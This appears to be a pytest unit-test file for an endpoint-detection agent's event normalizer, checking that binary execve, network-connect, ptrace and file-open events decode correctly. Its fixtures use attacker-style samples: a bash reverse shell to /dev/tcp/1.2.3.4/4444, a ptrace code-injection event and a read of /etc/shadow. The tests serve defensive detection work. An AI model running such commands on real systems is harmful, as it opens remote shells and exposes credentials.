"""
Unit tests for event_normalizer.py.

Verifies binary C-struct decoding, string extraction, network byte order conversion,
IPv4/IPv6 formatting, and dictionary normalization.
"""

import ctypes
import socket
import struct
import pytest

from agent.core.event_normalizer import (
    EventNormalizer,
    EventType,
    EDREventStruct,
    PTRACE_REQUEST_NAMES,
)


class TestEventNormalizer:
    def test_decode_execve_c_struct(self):
        """Verify binary C-struct decoding of an EXECVE event."""
        event_struct = EDREventStruct()
        event_struct.timestamp_ns = 1700000000123456789
        event_struct.event_type = EventType.EXECVE
        event_struct.pid = 4321
        event_struct.tgid = 4321
        event_struct.ppid = 1000
        event_struct.uid = 1000
        event_struct.gid = 1000
        event_struct.comm = b"bash\x00"
        
        event_struct.payload.exec.filename = b"/bin/bash\x00"
        event_struct.payload.exec.args = b"-i >& /dev/tcp/1.2.3.4/4444\x00"
        event_struct.payload.exec.retval = 0

        raw_bytes = bytes(event_struct)
        assert len(raw_bytes) == ctypes.sizeof(EDREventStruct)

        normalized = EventNormalizer.normalize(raw_bytes)

        assert normalized["event_type"] == "EXECVE"
        assert normalized["pid"] == 4321
        assert normalized["ppid"] == 1000
        assert normalized["uid"] == 1000
        assert normalized["comm"] == "bash"
        assert normalized["filename"] == "/bin/bash"
        assert normalized["args"] == "-i >& /dev/tcp/1.2.3.4/4444"
        assert normalized["cmdline"] == "/bin/bash -i >& /dev/tcp/1.2.3.4/4444"
        assert normalized["retval"] == 0

    def test_decode_connect_ipv4_c_struct(self):
        """Verify binary C-struct decoding of an IPv4 CONNECT event."""
        event_struct = EDREventStruct()
        event_struct.timestamp_ns = 1700000000987654321
        event_struct.event_type = EventType.CONNECT
        event_struct.pid = 5555
        event_struct.tgid = 5555
        event_struct.ppid = 1
        event_struct.uid = 0
        event_struct.gid = 0
        event_struct.comm = b"curl\x00"

        event_struct.payload.net.family = 2  # AF_INET
        event_struct.payload.net.dport = 443
        event_struct.payload.net.sport = 54321
        event_struct.payload.net.protocol = 6  # IPPROTO_TCP
        
        # 192.168.1.100 packed into 32-bit uint
        ip_int = struct.unpack("<I", socket.inet_aton("192.168.1.100"))[0]
        event_struct.payload.net.daddr_v4 = ip_int
        src_ip_int = struct.unpack("<I", socket.inet_aton("10.0.0.5"))[0]
        event_struct.payload.net.saddr_v4 = src_ip_int
        event_struct.payload.net.sock_fd = 3

        raw_bytes = bytes(event_struct)
        normalized = EventNormalizer.normalize(raw_bytes)

        assert normalized["event_type"] == "CONNECT"
        assert normalized["family"] == "IPv4"
        assert normalized["dest_ip"] == "192.168.1.100"
        assert normalized["dst_ip"] == "192.168.1.100"
        assert normalized["src_ip"] == "10.0.0.5"
        assert normalized["dest_port"] == 443
        assert normalized["src_port"] == 54321
        assert normalized["protocol"] == "TCP"

    def test_decode_ptrace_c_struct(self):
        """Verify binary C-struct decoding of a PTRACE event."""
        event_struct = EDREventStruct()
        event_struct.timestamp_ns = 1700000001000000000
        event_struct.event_type = EventType.PTRACE
        event_struct.pid = 8888
        event_struct.tgid = 8888
        event_struct.ppid = 1000
        event_struct.uid = 1000
        event_struct.gid = 1000
        event_struct.comm = b"injector\x00"

        event_struct.payload.ptrace.request = 4  # PTRACE_POKETEXT
        event_struct.payload.ptrace.target_pid = 1234
        event_struct.payload.ptrace.addr = 0x7FFF12345678
        event_struct.payload.ptrace.data = 0x90909090

        raw_bytes = bytes(event_struct)
        normalized = EventNormalizer.normalize(raw_bytes)

        assert normalized["event_type"] == "PTRACE"
        assert normalized["ptrace_request"] == "PTRACE_POKETEXT"
        assert normalized["ptrace_request_code"] == 4
        assert normalized["target_pid"] == 1234
        assert "0x7fff12345678" in normalized["addr"].lower()

    def test_decode_openat_c_struct(self):
        """Verify binary C-struct decoding of an OPENAT event."""
        event_struct = EDREventStruct()
        event_struct.timestamp_ns = 1700000002000000000
        event_struct.event_type = EventType.OPENAT
        event_struct.pid = 9999
        event_struct.tgid = 9999
        event_struct.ppid = 1000
        event_struct.uid = 1000
        event_struct.gid = 1000
        event_struct.comm = b"cat\x00"

        event_struct.payload.openat.filepath = b"/etc/shadow\x00"
        event_struct.payload.openat.flags = 0  # O_RDONLY
        event_struct.payload.openat.dfd = -100
        event_struct.payload.openat.retval = 0

        raw_bytes = bytes(event_struct)
        normalized = EventNormalizer.normalize(raw_bytes)

        assert normalized["event_type"] == "OPENAT"
        assert normalized["file_path"] == "/etc/shadow"
        assert normalized["filepath"] == "/etc/shadow"
        assert "O_RDONLY" in normalized["flags_desc"]

    def test_short_buffer_handling(self):
        """Verify truncated buffer returns empty dictionary gracefully."""
        short_bytes = b"\x00" * 16
        normalized = EventNormalizer.normalize(short_bytes)
        assert normalized == {}

    def test_synthetic_dict_normalization(self):
        """Verify normalization of synthetic dictionary inputs."""
        synthetic = {
            "event_type": "EXECVE",
            "comm": "sh",
            "filename": "/bin/sh",
            "args": "-c whoami",
            "dest_ip": "10.10.10.10",
            "dest_port": 8080,
        }
        normalized = EventNormalizer.normalize(synthetic)
        assert normalized["cmdline"] == "/bin/sh -c whoami"
        assert normalized["dst_ip"] == "10.10.10.10"
        assert normalized["dst_port"] == 8080
        assert "timestamp_utc" in normalized
